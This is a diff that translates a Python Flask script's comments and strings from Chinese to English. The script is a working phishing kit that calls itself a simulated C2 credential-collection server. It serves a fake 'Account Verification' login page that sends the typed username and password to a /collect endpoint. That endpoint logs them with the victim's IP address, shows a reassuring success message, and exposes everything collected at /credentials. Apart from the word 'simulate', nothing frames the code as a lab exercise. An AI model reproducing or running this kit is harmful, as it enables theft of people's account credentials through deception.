@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-凭证收集服务器 - 模拟C2服务器接收钓鱼攻击窃取的凭证
+Credential collection server - Simulate C2 server receiving credentials stolen by phishing attacks
 """
 
 import json
@@ -9,7 +9,7 @@ from datetime import datetime
 from flask import Flask, request, jsonify
 import logging
 
-# 配置日志
+# Configure logging
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s'
@@ -18,17 +18,17 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-# 存储收集到的凭证
+# Store collected credentials
 collected_credentials = []
 
 @app.route('/phish', methods=['GET'])
 def phishing_page():
-    """钓鱼页面"""
+    """Phishing page"""
     html = """
     <!DOCTYPE html>
     <html>
     <head>
-        <title>账户验证 - 请登录</title>
+        <title>Account Verification - Please Login</title>
         <style>
             body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
             .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; background: white; border-radius: 5px; }
@@ -39,12 +39,12 @@ def phishing_page():
     </head>
     <body>
         <div class="login-form">
-            <h2>账户验证</h2>
-            <p>为了确保您的账户安全，请重新验证您的登录信息：</p>
+            <h2>Account Verification</h2>
+            <p>To ensure your account security, please re-verify your login information:</p>
             <form id="loginForm">
-                <input type="text" id="username" placeholder="用户名/邮箱" required>
-                <input type="password" id="password" placeholder="密码" required>
-                <button type="submit">验证账户</button>
+                <input type="text" id="username" placeholder="Username/Email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Verify Account</button>
             </form>
         </div>
         <script>
@@ -53,7 +53,7 @@ def phishing_page():
                 var username = document.getElementById('username').value;
                 var password = document.getElementById('password').value;
                 
-                // 发送凭证到收集服务器
+                // Send credentials to collection server
                 fetch('/collect', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -64,7 +64,7 @@ def phishing_page():
                     })
                 }).then(response => response.json())
                 .then(data => {
-                    alert('验证成功！您的账户已安全。');
+                    alert('Verification successful! Your account is secure.');
                 });
             });
         </script>
@@ -75,11 +75,11 @@ def phishing_page():
 
 @app.route('/collect', methods=['POST'])
 def collect_credentials():
-    """接收钓鱼攻击窃取的凭证"""
+    """Receive credentials stolen by phishing attacks"""
     try:
         data = request.get_json() or request.form.to_dict()
         
-        # 记录凭证
+        # Record credentials
         credential_data = {
             'timestamp': datetime.now().isoformat(),
             'ip': request.remote_addr,
@@ -89,21 +89,21 @@ def collect_credentials():
         
         collected_credentials.append(credential_data)
         
-        logger.info(f"收到凭证: {data}")
+        logger.info(f"Received credentials: {data}")
         
-        # 返回成功响应（模拟正常登录页面）
+        # Return success response (simulate normal login page)
         return jsonify({
             'status': 'success',
             'message': 'Login successful'
         }), 200
         
     except Exception as e:
-        logger.error(f"处理凭证时出错: {e}")
+        logger.error(f"Error processing credentials: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/credentials', methods=['GET'])
 def get_credentials():
-    """获取所有收集到的凭证（用于调试）"""
+    """Get all collected credentials (for debugging)"""
     return jsonify({
         'count': len(collected_credentials),
         'credentials': collected_credentials
@@ -111,7 +111,7 @@ def get_credentials():
 
 @app.route('/health', methods=['GET'])
 def health_check():
-    """健康检查"""
+    """Health check"""
     return jsonify({
         'status': 'healthy',
         'timestamp': datetime.now().isoformat(),
@@ -119,5 +119,5 @@ def health_check():
     })
 
 if __name__ == '__main__':
-    logger.info("启动凭证收集服务器...")
+    logger.info("Starting credential collection server...")
     app.run(host='0.0.0.0', port=9000, debug=False) 
